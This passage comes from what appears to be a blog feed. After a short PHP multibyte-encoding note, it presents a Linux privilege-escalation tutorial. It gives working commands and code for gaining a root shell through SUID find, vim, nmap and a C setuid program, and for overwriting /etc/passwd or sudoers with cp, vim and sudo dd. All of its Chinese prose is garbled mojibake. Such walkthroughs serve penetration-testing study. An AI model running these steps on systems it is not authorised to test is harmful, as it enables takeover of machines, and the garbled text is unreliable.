code</p></blockquote><h2 id="6-PHPã®mbç³»åˆ—å‡½æ•°è¿”å›å€¼"><a href="#6-PHPã®mbç³»åˆ—å‡½æ•°è¿”å›å€¼" class="headerlink" title="6)PHPã®mbç³»åˆ—å‡½æ•°è¿”å›å€¼"></a>6)PHPã®mbç³»åˆ—å‡½æ•°è¿”å›å€¼</h2><blockquote><p><code>https://github.com/php/php-src/issues/9008</code></p><p>å®ƒä¼šå¯¼è‡´å¥‡æ€ªçš„ç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;BASE64&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="literal">null</span>, <span class="literal">true</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="title function_ invoke__">mb_detect_order</span>(), <span class="literal">true</span>),</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$string</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line"><span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$string</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ç»“æœå‘ç°</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Output for <span class="number">8.2</span><span class="number">.0</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.0</span><span class="number">.1</span> - <span class="number">8.0</span><span class="number">.26</span><span class="punctuation">,</span> <span class="number">8.1</span><span class="number">.10</span> - <span class="number">8.1</span><span class="number">.13</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.1</span><span class="number">.0</span> - <span class="number">8.1</span><span class="number">.9</span></span><br><span class="line">string(<span class="number">6</span>) <span class="string">&quot;BASE64&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br></pre></td></tr></table></figure><p><code>mb_detect_encoding($string, null, true)</code>è¿”å›å€¼</p><p>åªæœ‰åœ¨<code>PHP</code>ç‰ˆæœ¬åœ¨<code>8.1.0 - 8.1.9</code>æ—¶ä¼šè¿”å›<code>base64</code>ï¼Œè€Œåœ¨å…¶ä»–ç‰ˆæœ¬éƒ½æ˜¯é»˜è®¤è¯†åˆ«ä¸º<code>ASCII</code></p></blockquote><blockquote><p><code>mb_detect_encoding()</code>è¿™ç±»çš„å‡½æ•°å¯¹å†…å®¹è¿›è¡Œç¼–ç çš„è¯†åˆ«ï¼Œå°±æ˜¯<code>åŒ¹é…å†…å®¹ä¸­çš„ä¸€äº›ç¬¦åˆç¼–ç çš„å­—ç¬¦ï¼ŒåŒ¹é…æˆåŠŸå¯¹åº”ç¼–ç åŠ åˆ†</code>ï¼Œæœ€åä»å¤´åˆ°å°¾åŒ¹é…å®Œæˆåï¼Œ<code>æ‰“åˆ†æœ€é«˜çš„ç¼–ç å°±è¢«è®¤ä¸ºæ˜¯è¯¥å†…å®¹çš„ç¼–ç </code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxç‰¹æ®Šæƒé™ä½</title>
      <link href="/2023/02/13/Linux-PowerUp/"/>
      <url>/2023/02/13/Linux-PowerUp/</url>
      
        <content type="html"><![CDATA[<h1 id="Linuxç‰¹æ®Šæƒé™ä½"><a href="#Linuxç‰¹æ®Šæƒé™ä½" class="headerlink" title="Linuxç‰¹æ®Šæƒé™ä½"></a>Linuxç‰¹æ®Šæƒé™ä½</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjcxMjkyOA==&mid=2247484922&idx=1&sn=ba666d73dc1ed57385eda7210afca433&chksm=9baceb75acdb62634d94269e2052f2856bcebac7e1b0962f30132cbda7494813ae6ad2c0f88c&mpshare=1&scene=23&srcid=0830y3hzCRRlcsleoKEyGZr8&sharer_sharetime=1661831991788&sharer_shareid=30776e1834041fdca5e0b68533a2427e#rd">å‚è€ƒæ–‡ç« </a></p><h2 id="1ï¼‰åˆ©ç”¨SUIDææƒ"><a href="#1ï¼‰åˆ©ç”¨SUIDææƒ" class="headerlink" title="1ï¼‰åˆ©ç”¨SUIDææƒ"></a>1ï¼‰åˆ©ç”¨SUIDææƒ</h2><h3 id="ä»€ä¹ˆæ˜¯suidï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯suidï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯suidï¼Ÿ"></a>ä»€ä¹ˆæ˜¯suidï¼Ÿ</h3><blockquote><p>Set User   IDçš„ä¸€ç§æƒé™ç±»å‹ï¼Œå…è®¸ç”¨æˆ·ä½¿ç”¨æŒ‡å®šçš„ç”¨æˆ·æƒé™æ‰§è¡Œæ–‡ä»¶ã€‚é‚£äº›å…·ç”¨suidæƒé™çš„æ–‡ä»¶ä»¥æœ€é«˜çš„æƒé™è¿è¡Œã€‚å‡è®¾æˆ‘ä»¬ä»¥érootç”¨æˆ·èº«ä»½è®¿é—®ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶ä¸”æˆ‘ä»¬å‘ç°äºŒè¿›åˆ¶æ–‡ä»¶å¯ç”¨äº†suidä½ï¼Œé‚£ä¹ˆ<br>è¿™äº›æ–‡ä»¶&#x2F;ç¨‹åº&#x2F;å‘½ä»¤å¯ä»¥ä»¥rootæƒé™è¿è¡Œ</p><p>SUIDçš„ç›®çš„å°±æ˜¯ï¼šè®©æœ¬æ¥æ²¡æœ‰ç›¸åº”æƒé™çš„ç”¨æˆ·è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œå¯ä»¥è®¿é—®ä»–æ²¡æœ‰æƒé™çš„èµ„æº</p></blockquote><h3 id="ä»€ä¹ˆæ˜¯SGID"><a href="#ä»€ä¹ˆæ˜¯SGID" class="headerlink" title="ä»€ä¹ˆæ˜¯SGID"></a>ä»€ä¹ˆæ˜¯SGID</h3><blockquote><p>Gçš„æ„æ€å°±æ˜¯<code>group</code>ï¼ŒåŠŸèƒ½å’Œ<code>suid</code>åŸºæœ¬ä¸ç›¸åŒï¼Œå”¯ä¸€åŒºåˆ«å°±æ˜¯<code>suid</code>è·å¾—å‘½ä»¤æ‰€å±ç”¨æˆ·çš„èº«ä»½å’Œæƒé™ï¼Œè€Œ<code>sgid</code>æ˜¯è·å–æ‰€å±ç”¨æˆ·ç»„çš„èº«ä»½å’Œæƒé™</p></blockquote><h3 id="SUIDæƒé™"><a href="#SUIDæƒé™" class="headerlink" title="SUIDæƒé™"></a>SUIDæƒé™</h3><blockquote><p>1ï¼ŒSUIDæƒé™åªèƒ½è®¾ç½®äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>2ï¼Œå‘½ä»¤æ‰§è¡Œè€…è¦æœ‰äºŒè¿›åˆ¶æ–‡ä»¶çš„æ‰§è¡Œæƒã€‚</p><p>3ï¼Œå‘½ä»¤æ‰§è¡Œè€…æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ä¼šè·å¾—è¯¥ç¨‹åºçš„å±ä¸»èº«ä»½ã€‚</p><p>4ï¼ŒSUIDæƒé™åªåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆã€‚</p><p>å³å¦‚æœrootç»™ä¸€ä¸ªç¨‹åºèµ‹äºˆäº†SUIDæƒé™ï¼Œåˆ™æ™®é€šç”¨æˆ·åœ¨æ‰§è¡Œè¯¥ç¨‹åºè¿‡ç¨‹ä¸­ï¼Œæ˜¯rootæƒé™ã€‚</p></blockquote><hr><h3 id="å…³é”®"><a href="#å…³é”®" class="headerlink" title="*å…³é”®"></a>*å…³é”®</h3><p>1.æŸ¥çœ‹å…·æœ‰<code>root</code>ç”¨æˆ·æƒé™çš„<code>SUID</code>äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">å‘½ä»¤æ¥æŸ¥æ‰¾æ‹¥æœ‰SUIDæƒé™çš„ç¨‹åºã€‚</span><br><span class="line"></span><br><span class="line">permæŒ‡å®šæƒé™ï¼Œ<span class="attribute">-u</span>=sä»£è¡¨SUIDæƒé™ï¼ŒtypeæŒ‡å®šæ–‡ä»¶ç±»å‹ï¼Œfè¡¨ç¤ºå¸¸è§„æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>2.å·²çŸ¥çš„å¯ç”¨æ¥ææƒçš„<code>linux</code>å¯æ‰§è¡Œçš„æ–‡ä»¶åˆ—è¡¨å¦‚ä¸‹</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmapã€Vimã€<span class="built_in">find</span>ã€Bashã€<span class="built_in">More</span>ã€Lessã€Nanoã€cp</span><br></pre></td></tr></table></figure><hr><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><h4 id="ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell"><a href="#ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell"></a>ï¼ˆ1ï¼‰åˆ©ç”¨findè·å–rootæƒé™shell</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> <span class="regexp">/ -name filename -exec â€œ/</span>bin/shâ€ \;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªfilenameï¼Œåªè¦å­˜åœ¨å°±è¡Œï¼Œç›®çš„æ˜¯è®©findå‘½ä»¤å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œåé¢çš„-execå°±æ˜¯åŠ ä¸Šå‘½ä»¤</p><p>è¿™é‡Œfindæœ‰suidæƒé™ï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œæ—¶ï¼Œä¼šå˜æˆrootç”¨æˆ·ï¼Œæ‰§è¡Œ&#x2F;bin&#x2F;shå‘½ä»¤æ—¶ï¼Œä¼šè¿›å…¥rootç”¨æˆ·ï¼Œä»è€Œå®ç°ææƒ</p><p>å¦‚æœfindæ²¡æœ‰suidæƒé™ï¼Œæ‰§è¡Œ&#x2F;bin&#x2F;shå‘½ä»¤åï¼Œä»ç„¶æ˜¯æ™®é€šç”¨æˆ·</p><p>Â·&#x2F;ä¸ºæ ¹ç›®å½•<br>Â·-name æŒ‰æ–‡ä»¶åæŸ¥æ‰¾<br>Â·-exec å¯¹åŒ¹é…å¯¹è±¡æ‰§è¡Œçš„å‘½ä»¤ï¼Œä»¥;ç»“æŸ<br>ä½†æ˜¯ï¼ˆ;ï¼‰æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦ç”¨ï¼ˆ\ï¼‰è½¬ä¹‰</p></blockquote><h4 id="ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell"><a href="#ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell"></a>ï¼ˆ2ï¼‰åˆ©ç”¨cpè·å–rootæƒé™shell</h4><blockquote><p>ä»¥cpä¸ºä¾‹ï¼Œè¿™é‡Œç»™cpæ·»åŠ SUIDæƒé™åšæµ‹è¯•ï¼Œæ‹¥æœ‰SUIDæƒé™çš„ç¨‹åºä¼šæœ‰rwxå˜æˆrwsã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220830133409844.png" alt="image-20220830133409844"></p><p>å¯ä»¥é€šè¿‡</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ¥æŸ¥æ‰¾æ‹¥æœ‰SUIDæƒé™çš„ç¨‹åºã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220830133446426.png" alt="image-20220830133446426"></p><blockquote><p>å½“æ™®é€šç”¨æˆ·è¿è¡Œcpå‘½ä»¤æ—¶ï¼Œæ­¤æ—¶çš„cpæƒé™å°±ä¸ºrootï¼Œåˆ©ç”¨æ—¶ï¼Œå¯ä»¥cpæŠŠ&#x2F;etc&#x2F;passwdå¤åˆ¶åˆ°æ¡Œé¢ï¼Œç„¶åè¿›è¡Œä¿®æ”¹ã€‚</p><p>é¦–å…ˆç”¨opensslç”Ÿæˆä¸€ä¸ªå¯†ç ã€‚passwdå‚æ•°ä»£è¡¨ç”Ÿæˆä¸€ä¸ªå¯†ç ï¼Œ-1ä¸ºmd5ï¼Œ-saltæŒ‡å®šç›ï¼ˆéšæ„æŒ‡å®šï¼‰ï¼Œæœ€åè·Ÿè¦åŠ å¯†çš„å€¼ï¼Œä¹Ÿå°±æ˜¯å¯†ç abcd</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220830133504874.png" alt="image-20220830133504874"></p><blockquote><p>ç„¶åæŒ‰ç…§etc&#x2F;passwdçš„æ ¼å¼æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œæƒé™æŒ‰rootçš„å†™å³å¯ã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220830133645874.png" alt="image-20220830133645874"></p><blockquote><p>æ·»åŠ åæˆ‘ä»¬ç”¨cpå†æŠŠæ–‡ä»¶å¤åˆ¶å›å»è¿›è¡Œæ›¿æ¢ï¼Œæ­¤æ—¶å°±æ·»åŠ äº†ä¸€ä¸ªabcdç”¨æˆ·ï¼Œæƒé™ä¸ºrootã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220830133656254.png" alt="image-20220830133656254"></p><h4 id="ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell"><a href="#ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell"></a>ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell</h4><blockquote><p>vimåœ¨æœ‰SUIDæƒé™çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ç”¨æ¥è¿›è¡Œææƒæ“ä½œã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220830134124700.png" alt="image-20220830134124700"></p><blockquote><p>å½“vimè¢«èµ‹äºˆsuidæƒé™åï¼Œæ„å‘³ç€ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨vimå‘½ä»¤æ¥ç¼–è¾‘é‚£äº›åªèƒ½ç”±rootç¼–è¾‘çš„æ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡vimæ¥ç¼–è¾‘etc&#x2F;sudoersæ–‡ä»¶ï¼ˆæ™®é€šç”¨æˆ·ä¼šè¢«ç›´æ¥æ‹’ç»è®¿é—®ï¼‰ï¼Œåœ¨sudoersæ–‡ä»¶ä¸­é…ç½®æ™®é€šç”¨æˆ·çš„æƒé™ï¼Œæƒé™å’Œrootä¸€æ ·ï¼Œè¿™é‡Œä»¥testç”¨æˆ·ä¸ºä¾‹ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p></blockquote><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">test   </span>ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><blockquote><p>vimç¼–è¾‘åä¿å­˜æ—¶ç”¨wq!å¼ºåˆ¶ä¿å­˜ï¼Œvimè¿è¡Œæ—¶è™½ç„¶æ˜¯rootæƒé™ï¼Œä½†wqä¾ç„¶ä¼šæç¤ºåªè¯»ã€‚</p><p>éšåsudo bashå°±ä¼šè·å–ä¸€ä¸ªrootçš„shellã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220830134159252.png" alt="image-20220830134159252"></p><h4 id="ï¼ˆ4ï¼‰åˆ©ç”¨nmapè·å–rootæƒé™shell"><a href="#ï¼ˆ4ï¼‰åˆ©ç”¨nmapè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ4ï¼‰åˆ©ç”¨nmapè·å–rootæƒé™shell"></a>ï¼ˆ4ï¼‰åˆ©ç”¨nmapè·å–rootæƒé™shell</h4><h5 id="1-æ—§ç‰ˆ"><a href="#1-æ—§ç‰ˆ" class="headerlink" title="1.æ—§ç‰ˆ"></a>1.æ—§ç‰ˆ</h5><blockquote><p>nmapï¼ˆ2.02-5.21ï¼‰å­˜åœ¨äº¤æ¢æ¨¡å¼ï¼Œå¯åˆ©ç”¨ææƒ</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œ:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure><p>msfä¸­çš„æ¨¡å—ä¸ºï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit<span class="regexp">/unix/</span>local/setuid_nmap</span><br></pre></td></tr></table></figure><h5 id="2-æ–°ç‰ˆ"><a href="#2-æ–°ç‰ˆ" class="headerlink" title="2.æ–°ç‰ˆ"></a>2.æ–°ç‰ˆ</h5><blockquote><p>è¾ƒæ–°ç‰ˆå¯ä½¿ç”¨ <code>--script</code> å‚æ•°ï¼š</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å…ˆå†™å…¥ä¸€æ¡å‘½ä»¤</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br><span class="line">å†<span class="params">--script</span>å‚æ•°ï¼Œæ‰§è¡Œ</span><br><span class="line">sudo nmap <span class="params">--script=getshell</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸææƒ</p><p><img src="/2023/02/13/Linux-PowerUp/image-20221011132253611.png" alt="image-20221011132253611"></p><h4 id="ï¼ˆ5ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell"><a href="#ï¼ˆ5ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ5ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell"></a>ï¼ˆ5ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell</h4><blockquote><p>é™¤äº†ç³»ç»Ÿçš„ä¸€äº›å¯æ‰§è¡Œå‘½ä»¤ï¼Œè‡ªå·±å†™çš„å¯æ‰§è¡Œæ–‡ä»¶ä¹Ÿå¯æ·»åŠ SUIDæƒé™ã€‚ä¸è®ºcæˆ–è€…goæˆ–è€…å…¶ä»–è¯­è¨€éƒ½å¯ä»¥ï¼Œè¿™é‡Œä»¥cä¸ºä¾‹ã€‚</p></blockquote><p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨gccè¿›è¡Œç¼–è¯‘ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220830134227202.png" alt="image-20220830134227202"></p><p>ç¼–è¯‘åä¼ å…¥ç›®æ ‡æœºï¼Œè¿™é‡Œæ”¾åˆ°bin&#x2F;aaaç›®å½•ä¸‹ï¼Œç„¶åæ·»åŠ SUIDæƒé™æµ‹è¯•ã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220830134236889.png" alt="image-20220830134236889"></p><p>æ™®é€šç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶åï¼Œä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„shellã€‚</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220830134252824.png" alt="image-20220830134252824"></p><h2 id="2ï¼‰åˆ©ç”¨SUDOææƒ"><a href="#2ï¼‰åˆ©ç”¨SUDOææƒ" class="headerlink" title="2ï¼‰åˆ©ç”¨SUDOææƒ"></a>2ï¼‰åˆ©ç”¨SUDOææƒ</h2><h3 id="sudoå’Œsuçš„åŒºåˆ«"><a href="#sudoå’Œsuçš„åŒºåˆ«" class="headerlink" title="sudoå’Œsuçš„åŒºåˆ«"></a><strong>sudoå’Œsuçš„åŒºåˆ«</strong></h3><blockquote><p>1ï¼Œsudoæ˜¯ä»¥rootæƒé™å»è¿è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œsuæ˜¯å»åˆ‡æ¢ç”¨æˆ·çš„èº«ä»½ã€‚</p><p>2ï¼Œsudoåªè¦çŸ¥é“è‡ªå·±çš„å¯†ç å³å¯ï¼Œsuéœ€è¦çŸ¥é“è¢«åˆ‡æ¢ç”¨æˆ·çš„å¯†ç ã€‚</p></blockquote><h3 id="sudoersæ–‡ä»¶"><a href="#sudoersæ–‡ä»¶" class="headerlink" title="sudoersæ–‡ä»¶"></a><strong>sudoersæ–‡ä»¶</strong></h3><blockquote><p>&#x2F;etc&#x2F;sudoersæ–‡ä»¶ï¼Œæ˜¯sudoæƒé™çš„é…ç½®æ–‡ä»¶ã€‚å½“ä½¿ç”¨sudoæ¥å‘½ä»¤æ—¶ï¼Œlinuxç³»ç»Ÿä¼šåœ¨sudoersæ–‡ä»¶ä¸­æŸ¥æ‰¾å½“å‰ç”¨æˆ·ï¼Œæ ¹æ®å½“å‰ç”¨æˆ·æƒé™é…ç½®æ¥å†³å®šæ˜¯å¦å¯ä»¥è¿è¡Œç›¸å…³å‘½ä»¤ã€‚</p></blockquote><p>ä¾‹å¦‚æ·»åŠ testç”¨æˆ·çš„ç›¸å…³é…ç½®ï¼š</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901223741370.png" alt="image-20220901223741370"></p><p>æ ¼å¼å¦‚ä¸‹ï¼š</p><p><img src="/2023/02/13/Linux-PowerUp/image-20220901223808981.png" alt="image-20220901223808981"></p><h3 id="sudo-su-amp-amp-sudo-bash"><a href="#sudo-su-amp-amp-sudo-bash" class="headerlink" title="sudo su &amp;&amp; sudo bash"></a><strong>sudo su &amp;&amp; sudo bash</strong></h3><blockquote><p>å½“æ²¡æœ‰å¯¹æ™®é€šç”¨æˆ·åšä¸¥æ ¼çš„é™åˆ¶æ—¶ï¼Œæˆ–è€…é…ç½®æƒé™è¿‡å¤§æ—¶ï¼Œåˆ™å¯ä»¥å°è¯•sudo suæ¥åˆ‡æ¢åˆ°rootæƒé™ã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901223824172.png" alt="image-20220901223824172"></p><blockquote><p>æˆ–è€…æ‰§è¡Œsudo bashã€‚</p></blockquote><p><img src="/2023/02/13/Linux-PowerUp/image-20220901223837242.png" alt="image-20220901223837242"></p><blockquote><p>å½“visudoå‘½ä»¤ä¸èƒ½ç”¨æ—¶ï¼Œé™åˆ¶äº†éƒ¨åˆ†å‘½ä»¤ï¼Œåˆ™å¯ä»¥å°è¯•ä¸‹vimæ˜¯å¦è¢«ç¦ç”¨ï¼Œsudo vimä¹Ÿå¯ä»¥ç¼–è¾‘sudoersæ–‡ä»¶ï¼Œä¸”wq!å¯ä»¥æˆåŠŸä¿å­˜ã€‚</p></blockquote><h4 id="SUDO-dd-ææƒæ³•"><a href="#SUDO-dd-ææƒæ³•" class="headerlink" title="*SUDO -dd ææƒæ³•"></a>*SUDO -dd ææƒæ³•</h4><p><a href="https://www.cnblogs.com/zlgxzswjy/p/12746160.html">åŸæ–‡</a>            </p><blockquote><p>å½“ç”¨æˆ·å¯ä»¥é€šè¿‡sudoæ‰§è¡Œddå‘½ä»¤æ—¶ï¼Œå¯ä»¥è¢«ç”¨æ¥ææƒã€‚é€šè¿‡ddå‘½ä»¤è¦†ç›–åŸå§‹&#x2F;etc&#x2F;passwdæ–‡ä»¶ï¼Œä»¥è¾¾åˆ°ä¿®æ”¹å¯†ç çš„ç›®çš„</p></blockquote><p>1ã€åˆ›å»ºä¸€ä¸ªå·²çŸ¥å¯†ç çš„hashï¼Œä»¥å¤‡æ›¿æ¢æ—¶ä½¿ç”¨</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/etc</span><span class="variable">$ </span>openssl passwd <span class="number">-1</span> -salt <span class="number">123</span> password </span><br><span class="line"><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="title class_">KRa5a</span>.</span><br></pre></td></tr></table></figure><p>2ã€å¤‡ä»½åŸå§‹passwdæ–‡ä»¶ï¼Œä»¥é˜²ä¿®æ”¹é”™è¯¯æ—¶æ— æ³•è®¿é—®</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># cp <span class="regexp">/etc/</span>passwd <span class="regexp">/tmp/</span>passwd</span><br></pre></td></tr></table></figure><p>3ã€åˆ©ç”¨ç¬¬ä¸€æ­¥é‡Œç”Ÿæˆçš„hashæ„å»ºæ–°çš„passwd hashæ¡ç›®</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment"># cat passwd</span></span><br><span class="line"><span class="symbol">root:</span><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="symbol">KRa5a.:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span 